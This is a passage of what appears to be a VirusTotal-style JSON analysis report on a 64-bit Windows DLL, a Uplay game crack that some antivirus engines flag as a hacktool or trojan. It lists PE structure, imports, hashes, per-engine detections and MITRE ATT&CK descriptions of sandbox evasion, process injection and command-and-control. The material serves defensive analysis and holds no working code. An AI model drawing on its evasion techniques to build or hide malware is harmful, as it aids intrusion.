          "UPLAY_SAVE_Write",
          "UPLAY_SetGameSession",
          "UPLAY_SetLocale",
          "UPLAY_StartPlatform",
          "UPLAY_Startup",
          "UPLAY_USER_ClearGameSession",
          "UPLAY_USER_ConsumeItem",
          "UPLAY_USER_GetAccountId",
          "UPLAY_USER_GetAccountIdUtf8",
          "UPLAY_USER_GetCdKeyUtf8",
          "UPLAY_USER_GetCdKeys",
          "UPLAY_USER_GetConsumableItems",
          "UPLAY_USER_GetCredentials",
          "UPLAY_USER_GetEmail",
          "UPLAY_USER_GetEmailUtf8",
          "UPLAY_USER_GetNameUtf8",
          "UPLAY_USER_GetPassword",
          "UPLAY_USER_GetPasswordUtf8",
          "UPLAY_USER_GetTicketUtf8",
          "UPLAY_USER_GetUsername",
          "UPLAY_USER_GetUsernameUtf8",
          "UPLAY_USER_IsConnected",
          "UPLAY_USER_IsInOfflineMode",
          "UPLAY_USER_IsOwned",
          "UPLAY_USER_ReleaseConsumeItemResult",
          "UPLAY_USER_SetGameSession",
          "UPLAY_Update",
          "UPLAY_WIN_GetActions",
          "UPLAY_WIN_GetRewards",
          "UPLAY_WIN_RefreshActions"
        ],
        "resource_details": [
          {
            "lang": "ENGLISH US",
            "entropy": 5.1059465408325195,
            "chi2": 9434148,
            "filetype": "unknown",
            "sha256": "534285057c6f8f925d58d8cc49865aec0e64a1640c9943860966c44f09ccc37a",
            "type": "WAVE"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 3.3229212760925293,
            "chi2": 53798.95,
            "filetype": "unknown",
            "sha256": "3834c5980192345b3a5128f582337756d91d8019a4e119d61444f85b4352af77",
            "type": "RT_VERSION"
          }
        ],
        "rich_pe_header_hash": "303fb7d545204e8aade393cdf6eebbf4",
        "imphash": "17d8dde91374bccfc7c067f79edfa9f0",
        "overlay": {
          "entropy": 7.866822719573975,
          "offset": 899072,
          "chi2": 372.27,
          "filetype": "unknown",
          "size": 2052,
          "md5": "404e70159a7ccef879fc4f154fb021c7"
        },
        "compiler_product_versions": [
          "[---] Unmarked objects count=137",
          "[C++] VS2013 UPD3 build 30723 count=20",
          "[EXP] VS2013 UPD3 build 30723 count=1",
          "[RES] VS2013 build 21005 count=1",
          "[---] Resource count=1",
          "[LNK] VS2013 UPD3 build 30723 count=1",
          "id: 0xe1, version: 20806 count=38",
          "id: 0xe0, version: 20806 count=99",
          "id: 0xdf, version: 20806 count=10",
          "id: 0xe4, version: 30723 count=24",
          "id: 0xcb, version: 65501 count=9"
        ],
        "resource_langs": {
          "ENGLISH US": 2
        },
        "machine_type": 34404,
        "timestamp": 1416863879,
        "resource_types": {
          "RT_VERSION": 1,
          "WAVE": 1
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 517853,
            "virtual_address": 4096,
            "entropy": 6.61,
            "raw_size": 95744,
            "flags": "rx",
            "virtual_size": 95371,
            "md5": "b89ab1a97c501f6c62bf554a99226aae"
          },
          {
            "name": ".rdata",
            "chi2": 2044182.5,
            "virtual_address": 102400,
            "entropy": 4.77,
            "raw_size": 41472,
            "flags": "r",
            "virtual_size": 41304,
            "md5": "b58fbbde47f493681dc9e1962412f45c"
          },
          {
            "name": ".data",
            "chi2": 658756.44,
            "virtual_address": 147456,
            "entropy": 3.86,
            "raw_size": 7168,
            "flags": "rw",
            "virtual_size": 43320,
            "md5": "96a649473cd5741597b13db946dff5ab"
          },
          {
            "name": ".pdata",
            "chi2": 258593.95,
            "virtual_address": 192512,
            "entropy": 5.04,
            "raw_size": 6144,
            "flags": "r",
            "virtual_size": 5952,
            "md5": "78e587976ee6065b54430a68964849a6"
          },
          {
            "name": ".rsrc",
            "chi2": 9546158,
            "virtual_address": 200704,
            "entropy": 5.1,
            "raw_size": 318976,
            "flags": "r",
            "virtual_size": 318488,
            "md5": "eaf49bdbb700225eadbbceaf33581d9a"
          },
          {
            "name": ".RLD0",
            "chi2": 58702,
            "virtual_address": 520192,
            "entropy": 5.39,
            "raw_size": 2048,
            "flags": "rx",
            "virtual_size": 1564,
            "md5": "eabe736339289e4ca26b2ad241d7e753"
          },
          {
            "name": ".RLD1",
            "chi2": 566484,
            "virtual_address": 524288,
            "entropy": 7.63,
            "raw_size": 423936,
            "flags": "rx",
            "virtual_size": 423827,
            "md5": "a30141a604e25ec985557cc6cf179572"
          },
          {
            "name": ".reloc",
            "chi2": 36588,
            "virtual_address": 950272,
            "entropy": 5.41,
            "raw_size": 2560,
            "flags": "r",
            "virtual_size": 2320,
            "md5": "b37d55e74d28fd5756d9cb68cd8f8058"
          }
        ],
        "import_list": [
          {
            "library_name": "ADVAPI32.dll",
            "imported_functions": [
              "CryptAcquireContextA",
              "CryptCreateHash",
              "CryptDestroyHash",
              "CryptDestroyKey",
              "CryptHashData",
              "CryptImportKey",
              "CryptReleaseContext",
              "CryptVerifySignatureA"
            ]
          },
          {
            "library_name": "SHELL32.dll",
            "imported_functions": [
              "SHGetSpecialFolderPathA"
            ]
          },
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "CloseHandle",
              "CreateDirectoryA",
              "CreateEventA",
              "CreateFileA",
              "CreateFileW",
              "CreateThread",
              "DecodePointer",
              "DeleteCriticalSection",
              "DeleteFileA",
              "EncodePointer",
              "EnterCriticalSection",
              "ExitProcess",
              "FileTimeToSystemTime",
              "FindClose",
              "FindFirstFileA",
              "FindNextFileA",
              "FindResourceA",
              "FlushFileBuffers",
              "FreeEnvironmentStringsW",
              "GetACP",
              "GetCommandLineA",
              "GetConsoleCP",
              "GetConsoleMode",
              "GetCPInfo",
              "GetCurrentProcess",
              "GetCurrentProcessId",
              "GetCurrentThreadId",
              "GetEnvironmentStringsW",
              "GetFileAttributesA",
              "GetFileSizeEx",
              "GetFileType",
              "GetLastError",
              "GetLocalTime",
              "GetModuleFileNameA",
              "GetModuleFileNameW",
              "GetModuleHandleA",
              "GetModuleHandleExW",
              "GetModuleHandleW",
              "GetOEMCP",
              "GetPrivateProfileStringA",
              "GetProcAddress",
              "GetProcessHeap",
              "GetStartupInfoW",
              "GetStdHandle",
              "GetStringTypeW",
              "GetSystemInfo",
              "GetSystemTimeAsFileTime",
              "HeapAlloc",
              "HeapCreate",
              "HeapDestroy",
              "HeapFree",
              "HeapReAlloc",
              "HeapSize",
              "InitializeCriticalSection",
              "InitializeCriticalSectionAndSpinCount",
              "IsDebuggerPresent",
              "IsProcessorFeaturePresent",
              "IsValidCodePage",
              "LCMapStringW",
              "LeaveCriticalSection",
              "LoadLibraryA",
              "LoadLibraryExW",
              "LoadResource",
              "LockResource",
              "MultiByteToWideChar",
              "OutputDebugStringW",
              "QueryPerformanceCounter",
              "RaiseException",
              "ReadFile",
              "RtlCaptureContext",
              "RtlLookupFunctionEntry",
              "RtlPcToFileHeader",
              "RtlUnwindEx",
              "RtlVirtualUnwind",
              "SetEvent",
              "SetFilePointerEx",
              "SetLastError",
              "SetStdHandle",
              "SetUnhandledExceptionFilter",
              "SizeofResource",
              "Sleep",
              "SystemTimeToFileTime",
              "TerminateProcess",
              "TlsAlloc",
              "TlsFree",
              "TlsGetValue",
              "TlsSetValue",
              "UnhandledExceptionFilter",
              "VirtualAlloc",
              "VirtualFree",
              "VirtualProtect",
              "VirtualQuery",
              "WaitForMultipleObjects",
              "WideCharToMultiByte",
              "WriteConsoleW",
              "WriteFile",
              "WritePrivateProfileStringA"
            ]
          },
          {
            "library_name": "WINMM.dll",
            "imported_functions": [
              "waveOutClose",
              "waveOutOpen",
              "waveOutPrepareHeader",
              "waveOutReset",
              "waveOutUnprepareHeader",
              "waveOutWrite"
            ]
          }
        ],
        "entry_point": 48684
      },
      "magic": "PE32+ executable (DLL) (GUI) x86-64, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 5,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 28,
        "undetected": 43
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": "W64.AIDetectMalware",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Hacktool.Win32.Crack.3!c",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.119",
          "result": "malicious (moderate confidence)",
          "method": "blacklist",
          "engine_update": "20231129"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "FireEye": {
          "category": "undetected",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "Hacktool.Gamehack",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.Win64.Dropper.ch",
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "Crack-Reloaded",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": "unsafe",
          "method": "blacklist",
          "engine_update": "20231108"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5006",
          "result": "Tool.Crack.Win64.388",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Hacktool.Win32.Crack.Vki7",
          "method": "blacklist",
          "engine_update": "20231122"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.129.50366",
          "result": "Trojan ( 7000001d1 )",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Alibaba": {
          "category": "undetected",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.129.50366",
          "result": "Trojan ( 7000001d1 )",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (W)",
          "method": "blacklist",
          "engine_update": "20220812"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231127"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.591",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "ML.Attribute.HighConfidence",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28333",
          "result": "a variant of Win64/HackTool.Crack.CJ potentially unsafe",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 100)",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "APEX": {
          "category": "malicious",
          "engine_name": "APEX",
          "engine_version": "6.478",
          "result": "Malicious",
          "method": "blacklist",
          "engine_update": "20231128"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Avast": {
          "category": "undetected",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-12-02.01",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Generic Reputation PUA (PUA)",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "Trojan.Win64.GAMEHACK.USBLKS23",
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "Trapmine": {
          "category": "undetected",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231106"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "PUA.HackTool.Crack",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231201-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Webroot": {
          "category": "undetected",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "Varist": {
          "category": "undetected",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "HackTool/Win64.Crack",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "malicious",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.150.174",
          "result": "Trojan.Win64.Agent.ns",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36223",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23100.2009",
          "result": "HackTool:Win32/GameHack",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "GData": {
          "category": "undetected",
          "engine_name": "GData",
          "engine_version": "A:25.36906B:27.34062",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Google": {
          "category": "undetected",
          "engine_name": "Google",
          "engine_version": "1700731866",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231121"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "MAX": {
          "category": "undetected",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": "CrackTool.Agent",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "Trojan.Win64.GAMEHACK.USBLKS23",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "HackTool.GameHack!8.59E (CLOUD)",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Yandex": {
          "category": "malicious",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": "Trojan.Igent.bYWaEY.1",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.111408821.susgen",
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231201"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231202"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "DeepInstinct": {
          "category": "malicious",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": "MALICIOUS",
          "method": "blacklist",
          "engine_update": "20231128"
        }
      },
      "reputation": 33,
      "first_seen_itw_date": 1416867479
    },
    "type": "file",
    "id": "1a1c5cfc2a24ba5eaa67035d1ca2b5d954597de7dda0154eaef8f66d537672b0",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/1a1c5cfc2a24ba5eaa67035d1ca2b5d954597de7dda0154eaef8f66d537672b0"
    }
  },
  "mitre": {
    "data": {
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries the cryptographic machine GUID"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Checks if the current process is being debugged"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "id": "T1518.001",
                "name": "Security Software Discovery"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks if the current process is being debugged"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Spawns processes"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates a process in suspended mode (likely to inject code)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks if the current process is being debugged"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
